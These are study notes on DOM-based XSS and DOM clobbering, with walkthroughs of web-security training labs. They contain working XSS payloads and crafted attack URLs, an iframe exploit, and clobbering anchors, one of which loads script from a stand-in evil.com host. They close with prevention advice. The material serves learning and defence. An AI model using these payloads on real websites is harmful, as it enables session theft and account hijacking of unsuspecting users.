# DOM BASED

## What is the DOM?

* The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page.
  * Websites use JavaScript to manipulate the nodes and objects of the DOM and their properties.
  * JavaScript that handles data insecurely can enable various attacks.
* DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value and passes it into a dangerous function (a sink).

### DOM-based cross-site scripting

* This arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way and writes the data to the DOM.

Example:

```javascript
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

This can be attacked with a malicious value that causes script to execute. For example: You searched for:&#x20;

In most cases the input field would be populated from part of the HTTP request, e.g. a URL query string parameter.

### Taint-flow vulnerabilities

* Many DOM-based vulnerabilities can be traced back to problems in how client-side code manipulates attacker-controllable data.

#### What is Taint flow?

* Taint flow involves tracking potentially unsafe or untrusted data as it moves through a program to ensure it does not reach sensitive parts of the system.

Sources

* JavaScript properties that accept potentially attacker-controlled data:
  * `location.search` (reads inputs from the query string)
  * `document.referrer`
  * `document.cookie`
  * web messages, etc.

Sinks

* Potentially dangerous JavaScript functions or DOM objects that can cause undesirable effects if attacker-controlled data is passed to them:
  * `eval()` (executes argument as JavaScript)
  * HTML sinks like `document.body.innerHTML` (allows injection of malicious HTML and execution of arbitrary JavaScript)

DOM-based vulnerabilities arise when data flows from a source to a sink in an unsafe way.

Example showing unsafe handling of `location.hash`:

```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')){
    location = goto;
}
```

* Vulnerable because `location.hash` is attacker-controllable and is used unsafely to set `location`, allowing redirection to an attacker-controlled site.

Common sources (examples):

```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

### DOM-based XSS

* DOM-based XSS occurs when JavaScript takes data from an attacker-controllable source (e.g., URL) and passes it to a sink that supports dynamic code execution (e.g., `eval()` or `innerHTML`), enabling an attacker to execute malicious JavaScript (e.g., hijack user accounts).

***

### Labs (each lab is presented as a stepper)

{% stepper %}
{% step %}
### Lab: DOM XSS in document.write sink using source location.search — Overview

* Target: QuickSearch (Web\_Pentest730). The site displays search results dynamically and insecurely writes search queries directly to the webpage using `document.write()`. Input is taken from `location.search`, making it vulnerable to DOM-based XSS.

Goal: Inject HTML/JavaScript into the page by modifying the URL.
{% endstep %}

{% step %}
### Vulnerability — Problem

* `document.write()` is used with data from `location.search` without sanitization.
* `location.search` contains the URL query string (anything after `?`), which an attacker controls.
{% endstep %}

{% step %}
### Reconnaissance plan

* Enter a random alphanumeric string into the search box.
* Inspect and confirm the random string is placed inside an `img src` attribute in the resulting HTML.
* Task: break out of the `img` attribute context.
{% endstep %}

{% step %}
### Attack / Payload

* Payload: `"><svg onload=alert(1)>`
  * Breaks out of the `src` attribute of an `<img>` tag, closes the tag, injects an `<svg>` with `onload` that runs `alert(1)`.
{% endstep %}

{% step %}
### Exploit & Trigger

* Add payload to the URL query string: `https://YOUR-LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>`
* When the victim loads the URL, `location.search` is written to the page by `document.write()`. The injected SVG `onload` runs and triggers the alert.
{% endstep %}

{% step %}
### Why the exploit works & impact

* Breaking out of the attribute context: `">` closes `<img>` tag allowing new elements.
* `document.write()` writes input as-is—dangerous if unsanitized.
* `location.search` is attacker-controlled.
* Real-world impact: account hijacking (steal `document.cookie`), phishing (fake forms), malware distribution.
{% endstep %}

{% step %}
### Lab: DOM XSS in document.write sink using source location.search inside a select element — Overview

* Target: Online shopping platform (Web\_Pentest731). `storeId` parameter from URL is added as an `<option>` inside a `<select>` via `document.write()` without sanitization.
* Goal: Break out of `<select>`, inject HTML/JS, trigger an alert.
{% endstep %}

{% step %}
### Reconnaissance & Vulnerability

* Test with: `https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&storeId=test123`
* Confirm `test123` appears as `<option>test123</option>`.
* Vulnerability: `storeId` is written directly into an option with `document.write()`.
{% endstep %}

{% step %}
### Attack / Payload

* Payload: `"></select><img src=1 onerror=alert(1)>`
  * `">` closes the `<option>`.
  * `</select>` closes the `<select>`.
  * `<img src=1 onerror=alert(1)>` injects an image that fails to load and triggers `onerror`.
* Malicious URL: `https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`
{% endstep %}

{% step %}
### Exploit & Trigger

* Victim visits URL → payload breaks out of `<select>` and adds `<img>`.
* Image fails to load (`src=1`), `onerror` executes `alert(1)`.
{% endstep %}

{% step %}
### Why it works

* The payload closes `<option>` and `<select>`, allowing injection.
* `document.write()` writes input as-is.
* Injected `<img>` triggers `onerror` when load fails.
{% endstep %}

{% step %}
### Lab: DOM XSS in innerHTML sink using source location.search inside a div — Overview

* Target: techBlogs (Web\_Pentest731). Search terms from `location.search` are inserted into a `<div>` via `innerHTML`.
* Goal: Inject HTML through the URL, which `innerHTML` interprets and executes JS.
{% endstep %}

{% step %}
### Vulnerability

* Source: `location.search` from URL query string.
* Sink: `element.innerHTML` used to update a `<div>` element unsafely.
{% endstep %}

{% step %}
### Reconnaissance & Attack

* Payload: `<img src=1 onerror=alert(1)>`
* Malicious URL: `https://YOUR-LAB-ID.web-security-academy.net/?search=<img%20src=1%20onerror=alert(1)>`
{% endstep %}

{% step %}
### Exploit & Trigger

* Victim loads URL → `location.search` written into `<div>` using `innerHTML`.
* Browser creates `<img>` that fails to load and triggers `onerror` → `alert(1)`.
{% endstep %}

{% step %}
### Why it works

* `innerHTML` interprets input as HTML (no escaping).
* `location.search` is attacker-controlled.
* Real-world impact: cookie theft, etc.
{% endstep %}

{% step %}
### Lab: DOM XSS in jQuery anchor href attribute sink using location.search — Overview

* Target: feedbackHub (Web\_Pentest731). jQuery updates a "Back" link's `href` from the `returnPath` URL parameter.
* Goal: Inject a `javascript:` URL into `href` to execute arbitrary code (e.g., alert `document.cookie`).
{% endstep %}

{% step %}
### Vulnerability

* Source: `returnPath` from `location.search`.
* Sink: jQuery selector modifies anchor `href` attribute using untrusted input.
{% endstep %}

{% step %}
### Reconnaissance & Attack

* Test: `https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=/test123`
* Payload for `returnPath`: `javascript:alert(document.cookie)`
* Malicious URL: `https://YOUR-LAB-ID.web-security-academy.net/feedbackreturnPath=javascript:alert(document.cookie)`
{% endstep %}

{% step %}
### Exploit & Trigger

* Load the modified URL and click the "Back" link → `javascript:` URL executes and shows `document.cookie`.
{% endstep %}

{% step %}
### Why it works & impact

* jQuery attribute modification with untrusted input is a dangerous sink.
* `javascript:` scheme executes code when clicked.
* Real-world impact: cookie theft, phishing, drive-by malware.
{% endstep %}

{% step %}
### Lab: DOM XSS in jQuery selector sink using a hashchange event — Overview

* Target: Site uses `$(location.hash)` to scroll to posts based on URL hash and listens for `hashchange`.
* Vulnerability: `$(location.hash)` uses attacker-controlled hash in jQuery selector, enabling injection.
* Goal: Cause execution of `print()` via an injected payload in the hash using an iframe exploit.
{% endstep %}

{% step %}
### Reconnaissance & Attack

* Construct an iframe on the exploit server:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

* When the iframe loads it updates its `src` to include `<img src=x onerror=print()>` in the hash, triggering `hashchange` and the payload.
{% endstep %}

{% step %}
### Exploit & Trigger

* Save and view the exploit. Deliver the exploit to victim by serving the iframe.
* When the victim visits the iframe, the modified URL with malicious hash is auto-loaded and `print()` executes.
{% endstep %}

{% step %}
### Why it works & impact

* jQuery's `$()` selector combined with `location.hash` is treated as trusted and can be abused.
* The `hashchange` event can be triggered automatically by modifying `src` of an iframe.
* Real-world impact: data theft, phishing, drive-by malware.
{% endstep %}

{% step %}
### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded — Overview

* Target: AngularJS-based site (Web\_Pentest732) where search input is evaluated as an AngularJS expression inside `{{ }}`.
* Challenge: Angle brackets `<` and `>` are encoded, so classic tag-based payloads won't work.
* Goal: Execute JavaScript via AngularJS expression.
{% endstep %}

{% step %}
### Attack / Payload

* Use AngularJS expression: `{{$on.constructor('alert(1)')()}}`
  * `$on.constructor` accesses a constructor to build a new function from a string (`'alert(1)'`) and executes it.
* Enter the payload in the search box and trigger the search.
{% endstep %}

{% step %}
### Exploit & Trigger

* AngularJS evaluates the expression inside `{{ }}`. The payload becomes a function and executes `alert(1)`.
{% endstep %}

{% step %}
### Why it works & impact

* AngularJS will evaluate expressions inside `{{ }}` allowing arbitrary JS if an exploitable path exists.
* No angle brackets needed.
* Real-world impact: data theft, phishing, malware distribution.
{% endstep %}

{% step %}
### Lab: Reflected DOM XSS — Overview

* Target: Site (Web\_Pentest737) where the search term is sent to server, server reflects it in JSON response as `searchTerm`, and client code passes it to `eval()`.
* Goal: Break out of JSON string to execute JavaScript.
{% endstep %}

{% step %}
### Vulnerability & Reconnaissance

* Server reflects user input in JSON: `{"searchTerm":"XSS", "results":[]}`
* Client-side script processes JSON and uses `eval()`—unsafe if data isn't sanitized.
* Observe escaping behavior: double quotes `"` are escaped, but backslashes `\` may not be handled correctly.
{% endstep %}

{% step %}
### Attack / Payload

* Payload to break out of JSON string: `\"-alert(1)}//`
  * `\"` attempts to close/escape string.
  * `-` harmless arithmetic separator.
  * `alert(1)` JS to execute.
  * `}` closes JSON object.
  * `//` comments out remainder.
{% endstep %}

{% step %}
### Exploit & Trigger

* Search with the payload.
* JSON response may look like: `{"searchTerm":"\\"-alert(1)}//", "results":[]}`
* Due to improper handling of backslashes, this can result in `eval()` executing `alert(1)`.
{% endstep %}

{% step %}
### Why it works & impact

* Backslash injection subverts escaping.
* Breaking out of JSON string allows code injection.
* Using `eval()` executes the injected code.
* Real-world impact: cookie theft, phishing, malware.
{% endstep %}

{% step %}
### Lab: Stored DOM XSS — Overview

* Target: Blog site (Web\_Pentest74) storing comments. A comment is stored on server and later inserted into the DOM client-side unsafely. The site attempts to encode angle brackets but only replaces the first occurrence.
* Goal: Bypass the single-replacement encoding and execute JavaScript.
{% endstep %}

{% step %}
### Vulnerability & Reconnaissance

* Site encodes angle brackets `< >` only for the first occurrence in the string (e.g., using `replace()` once).
* Subsequent angle brackets remain unencoded and are interpreted as HTML.
{% endstep %}

{% step %}
### Attack / Payload

* Payload: `<><img src=1 onerror=alert(1)>`
  * The initial `<>` is encoded by the single-replacement filter, allowing the later `<img>` to remain and be interpreted as HTML.
* Submit the payload as a comment.
{% endstep %}

{% step %}
### Exploit & Trigger

* Comment is stored by the server.
* When another user views the post, the unsafe client-side script inserts the stored comment into the DOM (likely via `innerHTML`), rendering the `<img>` which fails to load and fires `onerror` → `alert(1)`.
{% endstep %}

{% step %}
### Why it works & impact

* The site’s filter replaces only the first `<`/`>`; extra brackets bypass the filter.
* The stored comment ends up in the DOM and is interpreted as HTML.
* Real-world impact: data theft, phishing, malware.
{% endstep %}
{% endstepper %}

***

### Common sinks that can lead to DOM-XSS vulnerabilities

```javascript
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

### jQuery functions that are also sinks

```javascript
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

***

## WEB DOM CLOBBERING

* Analogy: A JavaScript program is a party and variables are people wearing name tags. If an attacker injects an HTML element with an id/name that matches a global variable, the browser may resolve that global to the DOM node instead of the intended JS object.

Example vulnerable code:

```js
window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
};
```

Attacker injection:

```html
<a id=someObject name=url href=//evil.com/evil.js>
```

* `window.someObject` becomes the DOM node (the `<a>`), so `someObject.url` points to the link's `url`/`name` property, and a script is loaded from the attacker-controlled URL.

Dom clobbering is overwriting a JavaScript variable with a DOM element, often to trick the app into behaving unexpectedly.

#### How to find & test clobbering

* Look for code patterns like `window.xyz || {}` or global variables used without strict checks.
* Check places where HTML injection is possible (profile pages, comments, forums).
* Try injecting elements with id/name matching global variable names:

```html
<a id=target name=url href=//x.js>
<input name=submit>
<form name=data>
```

* Observe whether scripts/resources are loaded from attacker domains or behavior changes.
* In DevTools: inspect `console.log(window.someObject)` after injection to see if it's a DOM node.

***

### Lab: DOM-clobbering → Attribute injection → XSS

{% stepper %}
{% step %}
#### 1. Lab Introduction

* Feature: Comments that allow limited HTML anchors and render avatars using `defaultAvatar.avatar`.
* Attack vector: DOM clobbering via anchors sharing the same id, combined with attribute values that decode at runtime (e.g., `&quot;`) to break attribute syntax and inject an `onerror` handler.
* Techniques: DOM clobbering, attribute injection, unsafe client-side string concatenation / `innerHTML`.
{% endstep %}

{% step %}
#### 2. Reconnaissance plan

* Find comment posting pages allowing minimal HTML (e.g., `<a>`, `<img>`).
* Check sanitizer rules: can you include `id`, `name`, encoded quotes like `&quot;`, `cid:` protocols?
* Search client scripts for `window.someVar || {}` patterns, e.g., `let defaultAvatar = window.defaultAvatar || {...}`.
* Check whether avatars are injected via `innerHTML` or `img.src`.
{% endstep %}

{% step %}
#### 3. Vulnerability — Problem

* Source: reliance on global `window.defaultAvatar || {avatar: '...'}` combined with user-controlled HTML that can create `id`/`name` colliding with globals.
* Sink: unsafe HTML construction such as:

```js
parent.innerHTML = '<img src="' + defaultAvatar.avatar + '">';
```

* Sanitizer allows `id/name`, `cid:` protocol and `&quot;` sequences that decode into quotes at runtime.
{% endstep %}

{% step %}
#### 4. End goal

* Cause the site to render an element containing an `onerror` attribute executing `alert(1)`, demonstrating that clobbering + attribute injection bypasses filters.
{% endstep %}

{% step %}
#### 5. Attack (first attempt) — Payloads

Comment #1 (clobber):

```html
<a id=defaultAvatar></a>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a>
```

* Two `<a>` elements share `id=defaultAvatar` so `window.defaultAvatar` refers to the DOM collection/element.
* Second anchor has `name=avatar` and `href="cid:&quot;onerror=alert(1)//"`. When `&quot;` decodes to `"`, it can break attribute syntax later and inject `onerror`.
{% endstep %}

{% step %}
#### 6. Exploit & Trigger

1. Post Comment #1 (the two anchors).
2. Post Comment #2 (e.g., "Nice post!") to trigger re-render of comments.
3. Client executes code like:

```js
let defaultAvatar = window.defaultAvatar || { avatar: '/resources/images/avatarDefault.svg' };
parent.innerHTML = '<img src="' + defaultAvatar.avatar + '">';
```

* With `window.defaultAvatar` clobbered, `defaultAvatar.avatar` resolves to `cid:"onerror=alert(1)//`.
* Constructed HTML becomes:

```html
<img src="cid:"onerror=alert(1)//">
```

* Browser parses the broken attribute, image load fails, `onerror` fires → `alert(1)`.
{% endstep %}

{% step %}
#### 7. Enumeration

* Confirm comments accept minimal HTML and `id/name`.
* Locate client code patterns like `window.X || {}`.
* Verify avatar rendering uses `innerHTML` / unsafe templating.
* Test sanitizer: does it allow `cid:` and `&quot;`?
* Use DevTools to inspect `window.defaultAvatar` after comment #1 to confirm clobbering.
{% endstep %}

{% step %}
#### 8. Final payload & notes

* Comment #1 (clobber):

```html
<a id=defaultAvatar></a>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a>
```

* Comment #2 (trigger): `Nice post!`
* Single-line variant:

```html
<a id=defaultAvatar></a><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a>
```

Why it works:

* `id=defaultAvatar` clobbers JS variable.
* `name=avatar` provides `.avatar` property on the DOM collection.
* `&quot;` decodes to `"` and breaks `src="..."`, inserting `onerror`.
* Unsafe `innerHTML` concatenation results in a parsed element with `onerror`.

Real-world impact:

* Look for `window.X || {}` patterns and sanitizer allowances (cid:, `&quot;`).
* Clobbering can lead to script execution even when ordinary XSS vectors are filtered.
{% endstep %}
{% endstepper %}

***

### How to Prevent DOM-Based XSS (summary)

* Avoid using dangerous sinks like `document.write()` where possible. Prefer safe DOM APIs:
  * Use `textContent`, `innerText`, or set properties like `element.src` instead of `innerHTML`/string templating.
* Sanitize and encode user inputs appropriately for the context where they will be used.
* Implement a strong Content Security Policy (CSP) to limit sources of executable scripts and reduce XSS impact.
* Avoid relying on global variables that can be clobbered; validate and tightly control values used to build HTML.

***

(End of document)
